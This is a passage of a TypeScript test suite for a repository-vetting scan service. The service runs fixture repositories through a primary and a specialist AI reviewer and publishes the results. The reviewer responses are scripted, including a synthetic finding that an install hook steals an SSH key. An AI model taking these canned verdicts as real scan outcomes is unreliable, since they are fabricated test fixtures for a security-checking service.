// The bounded scan service end to end (PRD section 8; issue #909): one
// pass refreshes the queue, acquires the exact Git and template bytes,
// inspects them, runs the Surplus primary review and, only for an ambiguous
// result, the Surplus specialist, retains the evidence and publishes once.
// The malicious-detection and two-flag reinstatement scenarios come from
// the closed duplicate #1092.
// Every route is a real handler on the real migrations with local workerd
// R2. The Git API, GitHub identity and Surplus provider are local fixtures
// that answer exactly as those services do; no real provider or key is used.
import { afterEach, beforeEach, expect, test } from "bun:test";
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { readdirSync } from "node:fs";
import {
  mkdir,
  mkdtemp,
  readdir,
  readFile,
  rm,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { CloudflareProjectPersistence } from "../backend/projects/cloudflare-persistence";
import { projectRestriction } from "../backend/projects/enforcement";
import { handleProjectApi } from "../backend/projects/handler";
import { flaggerAuthority } from "../backend/projects/setup";
import { evidenceLocation } from "../backend/vetting/evidence-chunks";
import { githubFlaggerStanding } from "../backend/vetting/flagger-standing";
import {
  handleProjectFlagsApi,
  ProjectFlagStore,
} from "../backend/vetting/flags";
import {
  handleVettingApi,
  queueAutomaticScan,
  signedVettingRequest,
} from "../backend/vetting/handler";
import { CloudflareVettingPersistence } from "../backend/vetting/persistence";
import { isScanResult } from "../backend/vetting/scan-result";
import { applicationManifest } from "../tests/project-application-manifest";
import { sqliteD1 } from "../tests/sqlite-d1";
import { localVettingEvidence } from "../tests/vetting-evidence-fixture";
import {
  composeScanResult,
  executionInventory,
  inspectRepository,
  readAcquiredObject,
  readAcquiredSource,
} from "../workers/vetting/bounded-scan";
import { publishResult } from "../workers/vetting/publication";
import { acquireQueuedAssessment } from "../workers/vetting/queue";
import {
  runScanPass,
  type ScanServiceConfig,
  TEMPLATE_PREFIX,
} from "../workers/vetting/run";
import {
  reviewScan,
  SCAN_REVIEW_AREAS,
  type ScannerProfile,
} from "../workers/vetting/scanners";
import { signedVettingFetch } from "../workers/vetting/service";

const ORIGIN = "https://slop.cash";
const NOW = new Date("2026-10-18T12:00:00.000Z");
const APPLICANT = { githubId: "900000002", githubLogin: "e2e-applicant" };
const ADMIN = { githubId: "900000001", githubLogin: "e2e-admin" };
const ALICE = { githubId: "900000010", githubLogin: "alice" };
const BOB = { githubId: "900000011", githubLogin: "bob" };
const ACTORS: Record<string, { githubId: string; githubLogin: string }> = {
  applicant: APPLICANT,
  admin: ADMIN,
  alice: ALICE,
  bob: BOB,
};
const digest = (value: string | Uint8Array) =>
  createHash("sha256").update(value).digest("hex");
const templateText = "Follow the project rules and run the tests.\n";
const rendererText = "export const render = (value) => value;\n";
const templateInputs = {
  contributor: {
    sourcePath: "skills/contributor",
    files: [{ path: "SKILL.md", sha256: digest(templateText) }],
  },
  reviewer: {
    sourcePath: "skills/reviewer",
    files: [{ path: "SKILL.md", sha256: digest(templateText) }],
  },
  rendererSources: [{ path: "src/render.mjs", sha256: digest(rendererText) }],
  acceptedRevisions: ["1"],
};
let templateSha256 = digest(JSON.stringify(templateInputs));
const REPOSITORY_FILES: Record<string, string> = {
  "README.md": "# Fixture\nRun `bun test`.\n",
  "AGENTS.md": "Keep changes small and run the tests.\n",
  "package.json": JSON.stringify({
    name: "fixture",
    scripts: { test: "bun test" },
  }),
  "bun.lock": '{"lockfileVersion":1}',
  "src/index.ts": "export const parse = (value: string) => value.trim();\n",
};

let root: string;
let repository: string;
let commitSha: string;
let clock: Date;
let sqlite: ReturnType<typeof sqliteD1>["sqlite"];
let flags: ProjectFlagStore;
let retained: Awaited<ReturnType<typeof localVettingEvidence>>;
let projects: CloudflareProjectPersistence;
let vetting: CloudflareVettingPersistence;
let server: ReturnType<typeof Bun.serve>;
let config: ScanServiceConfig;
let resultPublicKeys: string;
let ids = 0;
let acquisitionRequests: { host: string; authorization: string | null }[];
let publicGitHubLimit: number;
/** The inventory items the primary reviewer last received. */
let reviewedItems: { id: string; text: string }[] = [];
/** The repository's current GitHub name; a recorded rename changes it. */
let githubName = "example/open-registry";
/** What the synthetic Surplus provider answers on each transport. */
let provider: {
  up: boolean;
  specialistUp: boolean;
  primary: "no-findings" | "findings" | "malicious-suspected";
  /** False makes every evidence route answer 503. */
  evidenceUp: boolean;
  calls: { path: string; model: string; authorization: string | null }[];
};

const gitWith = (input: string | undefined, ...args: string[]) => {
  const output = spawnSync("git", ["-c", "core.hooksPath=/dev/null", ...args], {
    cwd: repository,
    input,
  });
  if (output.status !== 0) throw new Error(output.stderr.toString());
  return output.stdout;
};
const git = (...args: string[]) => gitWith(undefined, ...args);

/** Commits files to the fixture repository; the live pin follows it. */
async function commit(
  files: Record<string, string | Uint8Array>,
  message: string,
) {
  for (const [path, text] of Object.entries(files)) {
    await mkdir(join(repository, path, ".."), { recursive: true });
    await writeFile(join(repository, path), text);
  }
  git("add", ".");
  git(
    "-c",
    "user.name=Fixture",
    "-c",
    "user.email=fixture@example.invalid",
    "commit",
    "--no-gpg-sign",
    "-qm",
    message,
  );
  commitSha = git("rev-parse", "HEAD").toString().trim();
}

function review(items: { id: string }[], verdict: string) {
  const risky = items.find((item) => item.id === "scripts/postinstall.js");
  return JSON.stringify({
    verdict,
    confidence: 0.9,
    coverage: Object.fromEntries(
      SCAN_REVIEW_AREAS.map((area) => [area, "complete"]),
    ),
    findings:
      verdict === "no-findings"
        ? []
        : [
            {
              severity:
                verdict === "malicious-suspected" ? "critical" : "medium",
              summary: risky
                ? "The install hook reads an SSH key and posts it out"
                : "Synthetic finding that needs a second opinion",
              evidenceIds: [(risky ?? items[0]).id],
            },
          ],
  });
}

/** Answers like Surplus: Anthropic Messages and OpenAI Responses. */
async function surplus(request: Request, path: string): Promise<Response> {
  const body = (await request.json()) as {
    model: string;
    messages?: { content: string }[];
    input?: string;
  };
  provider.calls.push({
    path,
    model: body.model,
    authorization: request.headers.get("authorization"),
  });
  if (!provider.up || (!provider.specialistUp && path === "/v1/responses"))
    return new Response("unavailable", { status: 503 });
  const usage = {
    input_tokens: 8,
    cache_read_input_tokens: 0,
    cache_creation_input_tokens: 0,
    output_tokens: 5,
  };
  if (path === "/anthropic/v1/messages") {
    const items = JSON.parse(body.messages?.[0].content ?? "{}").items;
    reviewedItems = items;
    return Response.json({
      id: "msg_fixture",
      model: body.model,
      stop_reason: "end_turn",
      content: [
        {
          type: "thinking",
          thinking: "Synthetic reasoning block",
          signature: "fixture",
        },
        {
          type: "text",
          text: "```json\n" + review(items, provider.primary) + "\n```",
        },
      ],
      usage,
    });
  }
  const items = JSON.parse(body.input ?? "{}").items;
  return Response.json({
    id: "resp_fixture",
    model: body.model,
    status: "completed",
    error: null,
    incomplete_details: null,
    output: [
      {
        type: "message",
        role: "assistant",
        content: [{ type: "output_text", text: review(items, "no-findings") }],
      },
    ],
    usage: {
      input_tokens: 8,
      input_tokens_details: { cached_tokens: 0 },
      output_tokens: 5,
    },
  });
}

const readLivePin = async () => ({ commitSha, templateSha256 });
const randomId = () =>
  `00000000-0000-4000-8000-${String(++ids).padStart(12, "0")}`;
const actorOf = (request: Request) =>
  ACTORS[request.headers.get("x-test-actor") ?? ""] ?? null;
/**
 * The real disposable runner from `workers/vetting-sandbox`, when the
 * isolated-artifact CI job starts it. Without it the route answers 503.
 */
const SANDBOX_URL = process.env.SLOP_SANDBOX_TEST_URL;
const sandbox = SANDBOX_URL
  ? {
      fetch: async (request: Request) =>
        fetch(`${SANDBOX_URL}${new URL(request.url).pathname}`, {
          method: request.method,
          headers: { "content-type": "application/json" },
          ...(request.method === "POST"
            ? { body: await request.arrayBuffer() }
            : {}),
        }),
    }
  : undefined;
const vettingDeps = () => ({
  sandbox,
  evidence: retained.evidence,
  vetting,
  flags,
  projects,
  resultPublicKeys,
  livePin: readLivePin,
  session: async () => null,
  now: () => clock,
  randomId,
});

function projectApi(request: Request) {
  return handleProjectApi(request, {
    persistence: projects,
    adminGithubIds: new Set([ADMIN.githubId]),
    moderatorGithubIds: new Set([ADMIN.githubId]),
    now: () => clock,
    randomId,
    sessionActor: async (value) => actorOf(value),
    repositoryControl: async () => ({ state: "matched", reason: "fixture" }),
    repositoryAccess: async () => ({
      installation: "installed",
      installationId: 1,
      permission: "admin",
      roleName: null,
    }),
    readTokenMetadata: async () => {
      throw new Error("no token reads in this suite");
    },
    github: { fetch: async () => new Response(null, { status: 404 }) },
    vettingClearance: (projectId, manifest, through, forReinstatement) =>
      vetting.manifestClearance(
        projectId,
        manifest,
        through,
        readLivePin,
        forReinstatement,
      ),
  }) as Promise<Response>;
}

/** The GitHub REST reads of repository identity and flag eligibility. */
function github(url: URL): Response {
  const path = url.pathname;
  // Only the current name answers: GitHub redirects a former name, and
  // acquisition follows no redirects.
  if (path === `/repos/${githubName}`)
    return Response.json({
      id: 123456789,
      node_id: "R_example",
      full_name: githubName,
      private: false,
    });
  const user = /^\/user\/([0-9]+)$/u.exec(path)?.[1];
  const actor = Object.values(ACTORS).find((entry) => entry.githubId === user);
  if (actor)
    return Response.json({
      id: Number(actor.githubId),
      login: actor.githubLogin,
      node_id: `U_${actor.githubId}`,
      type: "User",
      created_at: "2020-01-01T00:00:00Z",
    });
  if (/^\/repos\/[^/]+\/[^/]+\/issues$/u.test(path)) {
    const creator = Object.values(ACTORS).find(
      (entry) => entry.githubLogin === url.searchParams.get("creator"),
    );
    return Response.json(
      Array.from({ length: creator ? 2 : 0 }, (_, index) => ({
        number: index + 1,
        user: { id: Number(creator?.githubId) },
        pull_request: { merged_at: "2026-09-01T00:00:00Z" },
      })),
    );
  }
  return new Response(null, { status: 404 });
}

const flagApi = (request: Request) =>
  handleProjectFlagsApi(request, {
    flags,
    projects,
    sessionActor: async (value) => actorOf(value),
    flaggerStanding: githubFlaggerStanding({
      fetch: async (url: string) => github(new URL(url)),
      apiOrigin: "https://api.github.test",
      registryRepositories: async () =>
        (await projects.listProjects()).flatMap((entry) =>
          entry.manifest.repositories.map((item) => item.id),
        ),
    }),
    repositoryAuthority: async (manifest, actor) =>
      flaggerAuthority(
        {
          state: "read",
          access: {
            installation: "installed",
            installationId: 1,
            permission: "read",
            roleName: null,
          },
        },
        actor,
        manifest.repositories[0].id,
      ),
    moderatorGithubIds: [ADMIN.githubId],
    queueFreshScan: (project) =>
      queueAutomaticScan(
        vettingDeps(),
        project,
        "Automatic fresh scan after two contributor flags paused the project",
      ),
    now: () => clock,
    randomId,
  }) as Promise<Response>;

async function route(incoming: Request): Promise<Response> {
  const url = new URL(incoming.url);
  const host = incoming.headers.get("x-fixture-host");
  acquisitionRequests.push({
    host: host ?? "",
    authorization: incoming.headers.get("authorization"),
  });
  const path = url.pathname;
  if (host === "api.surplusintelligence.ai") return surplus(incoming, path);
  if (host === "raw.githubusercontent.com")
    return path.endsWith("/src/render.mjs")
      ? new Response(rendererText)
      : new Response(null, { status: 404 });
  if (host === "api.github.com") {
    const requests = acquisitionRequests.filter((r) => r.host === host);
    if (
      requests.length > publicGitHubLimit &&
      incoming.headers.get("authorization") !== "Bearer fixture-github-key"
    )
      return Response.json(
        { message: "API rate limit exceeded" },
        { status: 403 },
      );
    return github(url);
  }
  const request = new Request(`${ORIGIN}${path}${url.search}`, incoming);
  if (path === "/skill-templates/index.json")
    return Response.json({
      schemaVersion: "1",
      repository: "example/templates",
      commit: commitSha,
      templateSha256,
      revisionStatus: "committed",
      contributor: templateInputs.contributor,
      reviewer: templateInputs.reviewer,
      renderer: {
        sources: templateInputs.rendererSources,
        revisionStatus: "committed",
      },
      acceptedRevisions: templateInputs.acceptedRevisions,
    });
  if (path.startsWith("/skill-templates/")) return new Response(templateText);
  if (path.startsWith("/api/v1/vetting/evidence/") && !provider.evidenceUp)
    return Response.json({ error: "evidence_unavailable" }, { status: 503 });
  if (path.startsWith("/api/v1/vetting/evidence/"))
    return (
      (await retained.evidence.handle(request)) ??
      new Response(null, { status: 404 })
    );
  if (path.startsWith("/api/v1/vetting/"))
    return (
      (await handleVettingApi(request, vettingDeps())) ??
      new Response(null, { status: 404 })
    );
  return (await projectApi(request)) ?? new Response(null, { status: 404 });
}

const profile = (
  transport: ScannerProfile["transport"],
  reviewer: ScannerProfile["reviewer"],
  model: string,
): ScannerProfile => ({
  reviewer,
  transport,
  endpoint:
    transport === "anthropic-messages"
      ? "https://api.surplusintelligence.ai/anthropic/v1/messages"
      : "https://api.surplusintelligence.ai/v1/responses",
  model,
  apiKey: "fixture-surplus-key",
  maxOutputTokens: 1024,
  rateCard: {
    uncachedInputNanoUsdPerToken: "3",
    cachedInputNanoUsdPerToken: "1",
    cacheCreationNanoUsdPerToken: "4",
    outputNanoUsdPerToken: "9",
  },
});

beforeEach(async () => {
  acquisitionRequests = [];
  publicGitHubLimit = Number.POSITIVE_INFINITY;
  templateInputs.acceptedRevisions = ["1"];
  templateSha256 = digest(JSON.stringify(templateInputs));
  clock = NOW;
  githubName = "example/open-registry";
  root = await mkdtemp(join(tmpdir(), "slop-scan-service-"));
  repository = join(root, "git");
  await mkdir(repository);
  git("init", "-q");
  await commit(REPOSITORY_FILES, "Harmless fixture");
  const database = sqliteD1(
    readdirSync(new URL("../migrations", import.meta.url))
      .filter((name) => name.endsWith(".sql"))
      .sort(),
  );
  sqlite = database.sqlite;
  projects = new CloudflareProjectPersistence(database.db);
  flags = new ProjectFlagStore(database.db);
  retained = await localVettingEvidence(database.db, () => clock);
  vetting = new CloudflareVettingPersistence(
    database.db,
    async (a) => a.result !== null && retained.evidence.retained(a.result),
  );
  const pair = (await crypto.subtle.generateKey({ name: "Ed25519" }, true, [
    "sign",
    "verify",
  ])) as CryptoKeyPair;
  resultPublicKeys = Buffer.from(
    await crypto.subtle.exportKey("raw", pair.publicKey),
  ).toString("base64");
  // The evidence store verifies this service's own key.
  retained.evidence.deps.signed = (request, maximum) =>
    signedVettingRequest(
      request,
      { resultPublicKeys, now: () => clock },
      maximum,
    );
  provider = {
    up: true,
    specialistUp: true,
    primary: "no-findings",
    evidenceUp: true,
    calls: [],
  };
  server = Bun.serve({ port: 0, fetch: route });
  config = {
    connection: {
      origin: ORIGIN,
      ...pair,
      now: () => clock,
      // The fixture repository stands in for GitHub's Git transport.
      testGitRemote: () => `file://${repository}`,
      fetch: ((input: string | URL | Request, init?: RequestInit) => {
        const url = new URL(String(input));
        return fetch(
          `http://localhost:${server.port}${url.pathname}${url.search}`,
          {
            ...init,
            headers: { ...(init?.headers ?? {}), "x-fixture-host": url.host },
          },
        );
      }) as typeof fetch,
    },
    primary: profile("anthropic-messages", "opus", "claude-opus-5.5"),
    specialist: profile("openai-responses", "astra", "gpt-6.1-sol"),
    policyVersion: "scan-policy-1",
    workDirectory: join(root, "work"),
    journalDirectory: join(root, "journal"),
    randomId,
  };
  const created = await projectApi(
    new Request(`${ORIGIN}/api/v1/projects`, {
      method: "POST",
      headers: {
        "x-test-actor": "applicant",
        "content-type": "application/json",
        origin: ORIGIN,
      },
      body: JSON.stringify({
        manifest: applicationManifest("open-registry", "example/open-registry"),
      }),
    }),
  );
  expect(created.status).toBe(201);
});
afterEach(async () => {
  server.stop(true);
  await retained?.dispose();
  await rm(root, { recursive: true, force: true });
});

async function activate() {
  const project = await projects.getProject("open-registry");
  return projectApi(
    new Request(`${ORIGIN}/api/v1/admin/projects/open-registry/manifest`, {
      method: "PUT",
      headers: {
        "x-test-actor": "admin",
        "content-type": "application/json",
        origin: ORIGIN,
      },
      body: JSON.stringify({
        manifest: { ...project?.manifest, status: "active" },
        expectedRevision: project?.revision,
        reason: "Activate the scanned revision",
      }),
    }),
  );
}

/** Explicit test investigation, independent of routine admission refresh. */
async function requestInvestigation() {
  const project = await projects.getProject("open-registry");
  if (!project) throw new Error("Missing project");
  expect(
    await queueAutomaticScan(
      vettingDeps(),
      project,
      "Explicit fixture security investigation",
    ),
  ).toBe("queued");
}

test("source acquisition is one Git fetch; the GitHub credential reaches only the API identity read", async () => {
  await commit(
    Object.fromEntries(
      Array.from({ length: 65 }, (_, i) => [
        `src/file-${i}.ts`,
        `export const value${i} = ${i};\n`,
      ]),
    ),
    "More files than the anonymous API allowance once needed",
  );
  // The identity read is the only GitHub API request of an acquisition.
  publicGitHubLimit = 1;
  provider.up = false;
  config.githubToken = "fixture-github-key";
  const pass = await runScanPass(config);
  expect(pass.assessments[0]).toMatchObject({
    state: "retry",
    step: "primary-review",
  });
  const githubRequests = acquisitionRequests.filter(
    (r) => r.host === "api.github.com",
  );
  expect(githubRequests).toHaveLength(1);
  expect(githubRequests[0].authorization).toBe("Bearer fixture-github-key");
  expect(
    acquisitionRequests
      .filter((r) => r.host !== "api.github.com")
      .every((r) => r.authorization !== "Bearer fixture-github-key"),
  ).toBe(true);
  expect(await readdir(config.workDirectory)).toEqual([]);
});

test("evidence beyond the former 64 MiB run cap is retained in bounded parts", async () => {
  // A committed 70 MiB binary is a named artifact the intake must retain.
  const binary = new Uint8Array(70 * 1024 * 1024);
  for (let offset = 0; offset < binary.length; offset += 4096)
    binary[offset] = (offset / 4096) % 251;
  await commit({ "models/weights.bin": binary }, "Commit a large binary");
  const pass = await runScanPass(config);
  expect(pass.assessments[0]).toMatchObject({
    state: "published",
    disposition: "incomplete",
    outcome: "accepted",
    evidence: "retained",
  });
  const assessment = await vetting.getAssessment(
    (pass.assessments[0] as { assessmentId: string }).assessmentId,
  );
  const result = assessment?.result;
  if (!result || !isScanResult(result)) throw new Error("Missing scan result");
  const artifact = result.artifacts.find(
    (entry) => entry.path === "models/weights.bin",
  );
  expect(artifact?.state).toBe("quarantined");
  expect(await retained.evidence.retained(result)).toBe(true);
  const stored = sqlite
    .query(
      "SELECT size_bytes, storage, chunks FROM vetting_evidence_objects WHERE sha256=?",
    )
    .get(artifact?.sha256 ?? "") as {
    size_bytes: number;
    storage: string;
    chunks: string;
  };
  expect(stored.size_bytes).toBe(binary.length);
  expect(stored.storage).toBe("content");
  expect(JSON.parse(stored.chunks)).toHaveLength(9);
}, 180_000);

test("a repository beyond the former acquisition limits gets a complete batched review and clears", async () => {
  await commit(
    {
      ...Object.fromEntries(
        Array.from({ length: 1100 }, (_, index) => [
          `many/file-${String(index).padStart(4, "0")}.ts`,
          `export const value${index} = ${JSON.stringify("value ".repeat(170))};\n`,
        ]),
      ),
      // Data above the former 8 MiB per-file limit: deterministic checks only.
      "data/catalog.json": JSON.stringify({
        rows: "d".repeat(9 * 1024 * 1024),
      }),
    },
    "Exceed the former acquisition limits",
  );
  const pass = await runScanPass(config);
  expect(pass.assessments[0]).toMatchObject({
    state: "published",
    disposition: "clean",
    specialist: false,
    evidence: "retained",
  });
  const primaryCalls = provider.calls.filter(
    (call) => call.path === "/anthropic/v1/messages",
  );
  // Token-budgeted batches, then one repository-level synthesis that reads
  // the pre-pass and every batch result.
  expect(reviewedItems[0].id).toBe("prepass");
  const batches = reviewedItems.length - 1;
  expect(batches).toBeGreaterThan(1);
  expect(primaryCalls).toHaveLength(batches + 1);
  expect(provider.calls).toHaveLength(batches + 1);
  expect(reviewedItems.slice(1).map((item) => item.id)).toEqual(
    Array.from({ length: batches }, (_, index) => `batch-${index + 1}`),
  );
  const prepass = JSON.parse(reviewedItems[0].text);
  expect(prepass.deterministicOnly.files).toContainEqual(
    expect.objectContaining({ path: "data/catalog.json", class: "data" }),
  );
  const assessment = await vetting.getAssessment(
    (pass.assessments[0] as { assessmentId: string }).assessmentId,
  );
  const result = assessment?.result;
  if (!result || !isScanResult(result)) throw new Error("Missing scan result");
  expect(result.visibilityGaps).toEqual([]);
  expect(result.primaryReview.inputManifestSha256).toBe(
    result.assessed.inputManifestSha256,
  );
  expect((await activate()).status).toBe(200);
}, 120_000);

test("a pending admission recovers from a replaced template without an admin request", async () => {
  provider.up = false;
  const first = await runScanPass(config);
  const original = await vetting.getAssessment(
    first.assessments[0].assessmentId,
  );
  expect(original?.state).toBe("pending");
  if (!original) throw new Error("The first scan was not queued");

  templateInputs.acceptedRevisions = ["1", "2"];
  templateSha256 = digest(JSON.stringify(templateInputs));
  await commit(
    { "src/index.ts": "export const replacement = true;\n" },
    "Change source while the original scan is pending",
  );
  clock = new Date(clock.getTime() + 1000);
  provider.up = true;
  provider.calls = [];
  const next = await runScanPass(config);
  const assessments = await vetting.listAssessments();
  const current = assessments.find(
    (assessment) => assessment.id !== original.id,
  );
  expect(current?.templateSha256).toBe(templateSha256);
  expect(current?.commitSha).toBe(original.commitSha);
  expect(current?.manifestSha256).toBe(original.manifestSha256);
  expect(current?.revision).toBe(original.revision);
  expect(current?.state).toBe("clean");
  if (!current) throw new Error("The replacement was not recorded");
  expect(next.assessments).toEqual([
    {
      assessmentId: current?.id,
      state: "published",
      disposition: "clean",
      outcome: "accepted",
      specialist: false,
      evidence: "retained",
    },
  ]);
  expect(await vetting.getAssessment(original.id)).toEqual(original);
  expect(assessments).toHaveLength(2);
  expect(provider.calls).toHaveLength(1);
  expect((await activate()).status).toBe(200);

  // A refresh that raced the completed scan or a newer assignment cannot
  // install another pending scan over the accepted result.
  for (const previous of [original, current])
    expect(
      await vetting.createAssessment(
        {
          id: `vet_${randomId().replaceAll("-", "")}`,
          projectId: original.projectId,
          revision: original.revision,
          manifestSha256: original.manifestSha256,
          contentSha256: original.contentSha256,
          commitSha: original.commitSha,
          templateSha256,
          requestedBy: original.requestedBy,
          requestedAt: clock.toISOString(),
          requestReason: "Racing template replacement",
        },
        previous.id,
      ),
    ).toBe("conflict");

  // A later template change does not rescan an already admitted repository.
  templateInputs.acceptedRevisions = ["1", "2", "3"];
  templateSha256 = digest(JSON.stringify(templateInputs));
  expect((await runScanPass(config)).assessments).toEqual([]);
  expect(await vetting.listAssessments()).toHaveLength(2);
  expect(provider.calls).toHaveLength(1);
});

test("a pending investigation on an exempt project recovers without changing its exemption", async () => {
  await runScanPass(config);
  // Model a project present at migration 0075; the migration deliberately
  // prevents application code from granting this permanent exemption later.
  sqlite.exec("DROP TRIGGER vetting_grandfathered_projects_no_insert");
  sqlite
    .query(
      "INSERT INTO vetting_grandfathered_projects(project_id,granted_at) VALUES(?,?)",
    )
    .run("open-registry", clock.toISOString());
  await commit(
    { "src/investigation.ts": "export const inspectMe = true;\n" },
    "Explicit investigation source",
  );
  await requestInvestigation();
  provider.up = false;
  await runScanPass(config);
  const original = (await vetting.pendingAssessments())[0];
  expect(original.state).toBe("pending");
  const project = await projects.getProject("open-registry");
  if (!project) throw new Error("Missing exempt project");
  const clearance = () =>
    vetting.manifestClearance(
      project.id,
      project.manifest,
      project.revision,
      readLivePin,
    );
  expect(await clearance()).toEqual({
    state: "cleared",
    assessment: null,
    grandfathered: true,
  });
  templateInputs.acceptedRevisions = ["1", "2"];
  templateSha256 = digest(JSON.stringify(templateInputs));
  provider.up = true;
  const next = await runScanPass(config);
  expect(next.assessments).toMatchObject([
    { state: "published", disposition: "clean" },
  ]);
  const completed = await vetting.getAssessment(
    next.assessments[0].assessmentId,
  );
  expect(completed).toMatchObject({
    state: "clean",
    commitSha: original.commitSha,
    revision: original.revision,
    manifestSha256: original.manifestSha256,
    templateSha256,
  });
  expect(await vetting.getAssessment(original.id)).toEqual(original);
  expect(await clearance()).toEqual({
    state: "cleared",
    assessment: null,
    grandfathered: true,
  });
  templateInputs.acceptedRevisions = ["1", "2", "3"];
  templateSha256 = digest(JSON.stringify(templateInputs));
  expect((await runScanPass(config)).assessments).toEqual([]);
});

test("a provider outage leaves the scan pending; the next pass clears the project with one Surplus review", async () => {
  provider.up = false;
  const failed = await runScanPass(config);
  expect(failed.refreshed).toBe(true);
  expect(failed.assessments).toHaveLength(1);
  const [{ assessmentId }] = failed.assessments;
  expect(failed.assessments[0]).toEqual({
    assessmentId,
    state: "retry",
    step: "primary-review",
  });
  expect((await vetting.getAssessment(assessmentId))?.state).toBe("pending");
  expect(await readdir(config.journalDirectory)).toEqual([]);
  expect(await readdir(config.workDirectory)).toEqual([]);
  const refused = await activate();
  expect(refused.status).toBe(422);
  expect((await refused.json()).error).toBe("vetting_required");

  provider.up = true;
  provider.calls = [];
  const passed = await runScanPass(config);
  expect(passed.assessments).toEqual([
    {
      assessmentId,
      state: "published",
      disposition: "clean",
      outcome: "accepted",
      specialist: false,
      evidence: "retained",
    },
  ]);
  // One primary review through Surplus with the account key; no specialist.
  expect(provider.calls).toEqual([
    {
      path: "/anthropic/v1/messages",
      model: "claude-opus-5.5",
      authorization: "Bearer fixture-surplus-key",
    },
  ]);
  const assessment = await vetting.getAssessment(assessmentId);
  expect(assessment?.state).toBe("clean");
  expect(assessment?.commitSha).toBe(commitSha);
  expect((await activate()).status).toBe(200);
  // The queue is empty and the journal keeps the one attempt.
  expect((await runScanPass(config)).assessments).toEqual([]);
  expect(await readdir(config.journalDirectory)).toEqual([assessmentId]);
});

test("a recorded repository rename clears its admission scan under the registered repository", async () => {
  // The registry keeps the original path as the id and records the current
  // path as the appended alias and githubUrl (`assertRepositoryTransition`).
  const project = await projects.getProject("open-registry");
  if (!project) throw new Error("Missing project");
  const [registered] = project.manifest.repositories;
  const manifest = {
    ...project.manifest,
    repositories: [
      {
        ...registered,
        aliases: ["example/renamed-registry"],
        displayName: "example/renamed-registry",
        githubUrl: "https://github.com/example/renamed-registry",
      },
    ],
  };
  const manifestText = JSON.stringify(manifest);
  expect(
    await projects.appendProjectRevision(
      {
        projectId: project.id,
        expectedRevision: project.revision,
        manifest,
        manifestText,
        manifestSha256: digest(manifestText),
        reason: "Record the GitHub repository rename",
        actor: APPLICANT,
        at: clock.toISOString(),
      },
      await projects.enforcementGeneration(),
    ),
  ).toBe("updated");
  githubName = "example/renamed-registry";

  const report = await runScanPass(config);
  const [{ assessmentId }] = report.assessments;
  expect(report.assessments).toEqual([
    {
      assessmentId,
      state: "published",
      disposition: "clean",
      outcome: "accepted",
      specialist: false,
      evidence: "retained",
    },
  ]);
  const assessment = await vetting.getAssessment(assessmentId);
  expect(assessment?.state).toBe("clean");
  expect(assessment?.result?.assessed.repository).toBe(registered.id);
  expect((await activate()).status).toBe(200);
});

test("an ambiguous primary review runs the Surplus specialist once before publication", async () => {
  provider.primary = "findings";
  const report = await runScanPass(config);
  const [{ assessmentId }] = report.assessments;
  expect(report.assessments).toEqual([
    {
      assessmentId,
      state: "published",
      disposition: "clean",
      outcome: "accepted",
      specialist: true,
      evidence: "retained",
    },
  ]);
  expect(provider.calls.map((call) => [call.path, call.model])).toEqual([
    ["/anthropic/v1/messages", "claude-opus-5.5"],
    ["/v1/responses", "gpt-6.1-sol"],
  ]);
  const assessment = await vetting.getAssessment(assessmentId);
  expect(assessment?.state).toBe("clean");
});

function emptyCommit(message: string) {
  git(
    "-c",
    "user.name=Fixture",
    "-c",
    "user.email=fixture@example.invalid",
    "commit",
    "--allow-empty",
    "--no-gpg-sign",
    "-qm",
    message,
  );
  commitSha = git("rev-parse", "HEAD").toString().trim();
  clock = new Date(clock.getTime() + 1000);
}

/** An explicitly accepted native fixture: proves reuse routing, not malware detection. */
type NativeExecutionDefect = "artifact" | "image" | "egress" | "uncovered";
async function retainedNativeFixture(
  legacy = false,
  incomplete = false,
  defect?: NativeExecutionDefect,
) {
  await mkdir(config.workDirectory, { recursive: true });
  await mkdir(config.journalDirectory, { recursive: true });
  const native = new Uint8Array(32);
  native.set([0x7f, 0x45, 0x4c, 0x46, 2, 1]);
  native[18] = 0x3e;
  const nativeFiles: Record<string, Uint8Array> = { "bin/helper": native };
  if (defect === "uncovered") {
    const second = native.slice();
    second[30] = 2;
    nativeFiles["bin/second-helper"] = second;
  }
  await commit(nativeFiles, "Retain native fixture source");
  const project = await projects.getProject("open-registry");
  if (!project) throw new Error("Missing native fixture project");
  expect(
    await queueAutomaticScan(vettingDeps(), project, "Native fixture"),
  ).toBe("queued");
  const assignment = (await vetting.pendingAssessments())[0];
  const acquired = await acquireQueuedAssessment(
    config.connection,
    assignment.id,
    config.workDirectory,
  );
  const source = await readAcquiredSource(acquired.directory);
  const queued = JSON.parse(
    await readFile(join(acquired.directory, "queued-inputs.json"), "utf8"),
  ) as {
    inputs: { path: string; sha256: string }[];
  };
  const files = [...source.files];
  for (const file of queued.inputs)
    files.push({
      path: `${TEMPLATE_PREFIX}/${file.path}`,
      bytes: await readAcquiredObject(acquired.directory, file.sha256),
    });
  const inspection = inspectRepository({ files });
  const sourceBytes = inspection.inventory;
  const sourceSha = inspection.inventorySha256;
  const executionReport = new TextEncoder().encode(
    JSON.stringify({
      schema: "slop-isolated-artifact-v1",
      runId: "00000000-0000-4000-8000-000000000001",
      startedAt: NOW.toISOString(),
      completedAt: NOW.toISOString(),
      imageSha256: defect === "image" ? "e".repeat(64) : "c".repeat(64),
      sourceSha: "d".repeat(40),
      artifactSha256: defect === "artifact" ? "f".repeat(64) : digest(native),
      interpreter: "binary",
      internetEnabled: defect === "egress",
      status: "exited",
      exitCode: 0,
      stdoutBase64: "",
      stderrBase64: "",
      outputComplete: true,
    }),
  );
  const extension = executionInventory(inspection);
  extension.add(
    "execution:00000000-0000-4000-8000-000000000001",
    JSON.stringify({
      ...JSON.parse(new TextDecoder().decode(executionReport)),
      stdout: "",
      stderr: "",
    }),
  );
  extension.finish([]);
  // The fixture represents an independently accepted clean analysis. The
  // scanner itself never changes quarantine merely because execution exited.
  for (const artifact of incomplete ? [] : inspection.artifacts) {
    artifact.state = "released";
    artifact.analysis = "detonation-clean";
    artifact.requestedExecution = true;
  }
  const primary = await reviewScan({
    evidence: new TextDecoder().decode(inspection.inventory),
    inputSha256: inspection.inventorySha256,
    profile: config.primary,
    fetch: config.connection.fetch,
  });
  const composed = composeScanResult({
    queued: {
      assessmentId: assignment.id,
      ...assignment,
      repository: "example/open-registry",
    },
    inspection,
    policyVersion: config.policyVersion,
    runId: "native-original",
    startedAt: NOW.toISOString(),
    completedAt: NOW.toISOString(),
    primary,
    execution: {
